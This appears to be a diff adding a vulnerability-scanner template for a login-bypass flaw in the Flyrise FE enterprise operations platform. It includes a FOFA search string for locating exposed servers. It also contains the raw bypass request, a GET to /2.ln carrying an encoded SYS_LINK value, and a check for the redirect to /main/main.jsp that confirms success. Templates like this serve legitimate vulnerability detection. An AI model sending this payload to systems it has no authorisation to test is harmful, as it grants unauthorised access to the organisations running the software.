@@ -1,0 +1,28 @@
+id: flyrise-fe-2-ln-login-bypass
+
+info:
+  name: 飞企互联-FE企业运营管理平台登录绕过漏洞
+  author: qwtd
+  severity: high
+  description: |
+    FOFA: "flyrise.stopBackspace.js"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-FE%E4%BC%81%E4%B8%9A%E8%BF%90%E8%90%A5%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
+  tags: 飞企互联-FE业务协作平台
+
+http:
+  - raw:
+      - |
+        GET /2.ln?SYS_LINK=77507068764957484a5067777862714f457a66574871642f4330574c76717868394a35496d37416c497951724f33446f51486375685a5a2b31684938472b7056 HTTP/1.1
+        Host: {{Hostname}}
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "/main/main.jsp"
+
